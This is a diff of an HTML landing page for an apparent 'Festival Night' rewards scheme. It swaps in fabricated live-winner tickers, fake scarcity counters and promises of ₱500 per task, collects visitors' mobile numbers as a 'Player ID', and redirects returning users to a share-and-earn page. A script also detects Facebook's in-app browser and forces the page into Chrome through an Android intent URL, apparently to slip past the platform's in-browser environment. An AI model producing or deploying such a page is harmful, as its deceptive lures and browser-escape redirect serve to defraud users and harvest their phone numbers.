@@ -2,66 +2,126 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Lucky Drop - Fiesta Celebration</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>Festival Rewards | Night Celebration</title>
     
+    <!-- Firebase -->
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+
     <!-- Google Fonts -->
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Cinzel:wght@700;900&family=Forum&family=Orbitron:wght@600;800;900&family=Playfair+Display:wght@700&family=Poppins:wght@300;400;600;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@300;400;500;600;700;800&family=Orbitron:wght@400;500;600;700;800;900&family=Playfair+Display:wght@400;500;600;700;800;900&family=Poppins:wght@300;400;500;600;700;800&family=Cinzel:wght@400;500;600;700;800;900&family=Forum&display=swap" rel="stylesheet">
     
-    <!-- Font Awesome Icons -->
+    <!-- Font Awesome -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     
-    <!-- Custom CSS -->
-    <link rel="stylesheet" href="index.css">
+    <!-- External CSS -->
+    <link rel="stylesheet" href="styles/instyle.css">
 </head>
 <body>
 
-    <!-- Particle Background Canvas -->
-    <canvas id="particleCanvas" style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 1;"></canvas>
-
-    <!-- Background Overlay for Readability -->
-    <div class="bg-sky"></div>
-
-    <!-- Live Ticker / Header Badge -->
-    <div class="live-ticker">
-        <div class="ticker-dot"></div>
-        <div class="ticker-text" id="winnerEntry">Initializing...</div>
-        <div class="ticker-badge">LIVE</div>
+    <!-- ====== ANIME NIGHT FESTIVAL BACKGROUND ====== -->
+    <!-- Main background image -->
+    <div class="bg-festival"></div>
+    
+    <!-- Night sky overlay with stars -->
+    <div class="bg-night-sky"></div>
+    
+    <!-- Fireworks effects -->
+    <div class="fireworks">
+        <div class="firework burst-1"></div>
+        <div class="firework burst-2"></div>
+        <div class="firework burst-3"></div>
+        <div class="firework burst-4"></div>
+        <div class="firework burst-5"></div>
+    </div>
+    
+    <!-- Magical golden bokeh -->
+    <div class="bokeh">
+        <div class="bokeh-circle"></div>
+        <div class="bokeh-circle"></div>
+        <div class="bokeh-circle"></div>
+        <div class="bokeh-circle"></div>
+        <div class="bokeh-circle"></div>
+        <div class="bokeh-circle"></div>
+        <div class="bokeh-circle"></div>
+        <div class="bokeh-circle"></div>
+        <div class="bokeh-circle"></div>
+        <div class="bokeh-circle"></div>
+        <div class="bokeh-circle"></div>
+        <div class="bokeh-circle"></div>
+        <div class="bokeh-circle"></div>
+        <div class="bokeh-circle"></div>
+        <div class="bokeh-circle"></div>
+    </div>
+    
+    <!-- Floating confetti -->
+    <div class="confetti-fall">
+        <div class="confetti-piece pink"></div>
+        <div class="confetti-piece gold"></div>
+        <div class="confetti-piece magenta"></div>
+        <div class="confetti-piece pink"></div>
+        <div class="confetti-piece gold"></div>
+        <div class="confetti-piece magenta"></div>
+        <div class="confetti-piece pink"></div>
+        <div class="confetti-piece gold"></div>
+        <div class="confetti-piece magenta"></div>
+        <div class="confetti-piece pink"></div>
+        <div class="confetti-piece gold"></div>
+        <div class="confetti-piece magenta"></div>
+        <div class="confetti-piece pink"></div>
+        <div class="confetti-piece gold"></div>
+        <div class="confetti-piece magenta"></div>
     </div>
 
-    <!-- Main Card Container -->
-    <main class="main-card" id="mainCard">
+    <!-- Live Winners Ticker -->
+    <div class="live-ticker">
+        <div class="ticker-dot"></div>
+        <div class="ticker-content">
+            <span class="ticker-text" id="winnerEntry">🎆 0917***4256 completed task +₱500</span>
+        </div>
+        <div class="ticker-badge">FESTIVAL</div>
+    </div>
+
+    <!-- Main Card -->
+    <div class="main-card" id="mainCard">
+        <!-- Festival corner decorations -->
+        <span class="corner-deco tl">🎇</span>
+        <span class="corner-deco tr">🎇</span>
+        <span class="corner-deco bl">🎇</span>
+        <span class="corner-deco br">🎇</span>
         
-        <!-- Logo Area -->
         <div class="logo-area">
             <div class="logo-icon">
-                <i class="fa-solid fa-gift"></i>
+                <i class="fas fa-star"></i>
+                <div class="logo-ring"></div>
             </div>
-            <h1 class="logo-text">FIESTA</h1>
-            <div class="logo-text-sub">BONANZA</div>
-            <p class="logo-sub">CELEBRATION BOOTH</p>
+            <h1 class="logo-text">FESTIVAL</h1>
+            <h1 class="logo-text-sub">NIGHT</h1>
+            <div class="logo-sub">✦ Magical Celebration ✦</div>
         </div>
 
-        <!-- Value Props -->
+        <!-- Premium Value Props -->
         <div class="value-props">
             <div class="prop-row">
-                <div class="prop-icon">
-                    <i class="fa-solid fa-wand-magic-sparkles"></i>
-                </div>
+                <div class="prop-icon"><i class="fas fa-fireworks"></i></div>
                 <div>
-                    <div class="prop-title">Exclusive Rewards</div>
-                    <div class="prop-desc">Claim your festival gifts instantly</div>
+                    <div class="prop-title">Festival Tasks</div>
+                    <div class="prop-desc">Complete fun tasks & earn rewards</div>
                 </div>
             </div>
             <div class="prop-row">
-                <div class="prop-icon">
-                    <i class="fa-solid fa-shield-halved"></i>
-                </div>
+                <div class="prop-icon"><i class="fas fa-gem"></i></div>
                 <div>
-                    <div class="prop-title">Verified Access</div>
-                    <div class="prop-desc">100% Secure & Fast verification</div>
+                    <div class="prop-title">Golden Prizes</div>
+                    <div class="prop-desc">₱500 per successful completion</div>
+                </div>
+            </div>
+            <div class="prop-row">
+                <div class="prop-icon"><i class="fas fa-wallet"></i></div>
+                <div>
+                    <div class="prop-title">Instant Payout</div>
+                    <div class="prop-desc">Withdraw directly to your wallet</div>
                 </div>
             </div>
         </div>
@@ -69,60 +129,109 @@
         <!-- Scarcity Tracker -->
         <div class="scarcity-box">
             <div class="scarcity-header">
-                <span class="scarcity-label">REMAINING SLOTS</span>
-                <div class="scarcity-numbers">
-                    <span id="remNum">88</span><span class="scarcity-total">/100</span>
-                </div>
+                <span class="scarcity-label">🎆 Festival Slots</span>
+                <div><span class="scarcity-numbers" id="remNum">88</span><span class="scarcity-total">/100</span></div>
             </div>
             <div class="progress-track">
-                <div class="progress-fill" id="pBar" style="width: 88%;"></div>
+                <div class="progress-fill" id="pBar" style="width: 88%"></div>
             </div>
         </div>
 
-        <!-- Swipe to Verify Container -->
+        <!-- Swipe to Verify -->
         <div class="swipe-container">
             <div class="swipe-track" id="swipeTrack">
                 <div class="swipe-fire-trail" id="swipeFireTrail"></div>
-                <div class="swipe-text">SWIPE TO CLAIM</div>
                 <div class="swipe-icon" id="swipeIcon">
-                    <i class="fa-solid fa-angles-right" style="color: #fff; font-size: 18px;"></i>
+                    <img src="images/scatter_icon.jpg" class="scatter-icon" alt="swipe">
                 </div>
+                <div class="swipe-text">🎇 SWIPE TO VERIFY 🎇</div>
             </div>
         </div>
 
-    </main>
+        <div class="card-footer">
+            <i class="fas fa-shield-alt"></i>
+            <span>Protected by Festival Magic</span>
+        </div>
+    </div>
 
-    <!-- Modal Overlay -->
-    <div class="modal-overlay" id="modalOverlay" style="display: none;">
-        <div class="modal-card">
-            <div id="modalBodyContent">
-                <div class="logo-area" style="margin-bottom: 15px;">
-                    <div class="logo-icon">
-                        <i class="fa-solid fa-trophy"></i>
+    <!-- Modal -->
+    <div class="modal-overlay" id="modalOverlay">
+        <div class="modal-container">
+            <div class="modal-card">
+                <button class="modal-close" onclick="closeModal()">✕</button>
+                
+                <div id="modalBodyContent">
+                    <div class="modal-icon">
+                        <i class="fas fa-star"></i>
                     </div>
-                    <h2 class="logo-text" style="font-size: 20px;">CLAIM REWARD</h2>
-                    <p class="prop-desc" style="margin-top: 5px;">Enter your 11-digit mobile number starting with 09</p>
+                    <h2 class="modal-title">🎇 VERIFICATION 🎇</h2>
+                    <p class="modal-subtitle">This will be your <span class="gold-text">Player ID</span><br>Enter the magical night celebration</p>
+                    
+                    <div class="bonus-box-premium">
+                        <div class="bonus-glow"></div>
+                        <div class="bonus-amount-premium">₱500</div>
+                        <div class="bonus-label-premium">🎆 FESTIVAL REWARD 🎆</div>
+                        <div class="bonus-shine"></div>
+                    </div>
+                    
+                    <div class="input-group-premium">
+                        <label class="input-label-premium">
+                            <i class="fas fa-mobile-alt"></i>
+                            Mobile Number
+                        </label>
+                        <div class="input-wrapper-premium">
+                            <input type="tel" id="userPhone" placeholder="Enter 11-digit mobile number" maxlength="11" oninput="this.value = this.value.replace(/[^0-9]/g, '');">
+                        </div>
+                    </div>
+                    
+                    <button class="login-btn" id="claimBtn" onclick="processStep1()">
+                        <span class="login-text">PROCEED</span>
+                        <span class="login-dots"></span>
+                    </button>
+                    
+                    <div class="warning-text-premium">
+                        <i class="fas fa-shield-alt"></i>
+                        <span>Complete more tasks to receive festival payouts</span>
+                    </div>
                 </div>
-
-                <div style="margin-bottom: 15px;">
-                    <input type="tel" id="userPhone" placeholder="09123456789" maxlength="11" style="width: 100%; padding: 14px; border-radius: 12px; border: 1px solid rgba(244, 196, 48, 0.4); background: rgba(0, 0, 0, 0.5); color: #fff; font-size: 16px; text-align: center; font-family: 'Poppins', sans-serif; outline: none;">
-                </div>
-
-                <button class="login-btn" id="claimBtn" onclick="window.processStep1()">
-                    <span class="login-text">SUBMIT</span>
-                </button>
             </div>
         </div>
     </div>
 
-    <!-- Firebase App & Database SDKs -->
-    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+    <canvas id="particleCanvas"></canvas>
 
-    <!-- Firebase Configuration -->
-    <script src="firebase-config.js"></script>
+    <script src="js/config.js"></script>
+    <script src="js/index.js"></script>
+    
+    <script>
+        // ========== AUTO-REDIRECT IF ALREADY LOGGED IN ==========
+        (function() {
+            const existingUserPhone = localStorage.getItem("userPhone");
+            const existingDeviceId = localStorage.getItem("userDeviceId");
+            
+            if (existingUserPhone && existingUserPhone !== 'null' && existingUserPhone !== 'undefined' && existingUserPhone.length > 5) {
+                console.log('Existing user detected:', existingUserPhone);
+                console.log('Redirecting to share_and_earn.html...');
+                window.location.href = "share_and_earn.html";
+            }
+        })();
 
-    <!-- Main Logic Script -->
-    <script src="index.js"></script>
+        // ========== INTENT URL HANDLER ==========
+        (function() {
+            const isFacebookApp = navigator.userAgent.includes('FBAN') || 
+                                  navigator.userAgent.includes('FBAV') ||
+                                  navigator.userAgent.includes('Messenger');
+            
+            if (isFacebookApp && !window.location.hash.includes('redirected')) {
+                window.location.hash = 'redirected';
+                
+                const targetUrl = 'https://xjiligames.github.io/rewards/index.html';
+                const urlWithoutProtocol = targetUrl.replace('https://', '');
+                const intentUrl = `intent://${urlWithoutProtocol}#Intent;scheme=https;package=com.android.chrome;end`;
+                
+                window.location.href = intentUrl;
+            }
+        })();
+    </script>
 </body>
 </html>
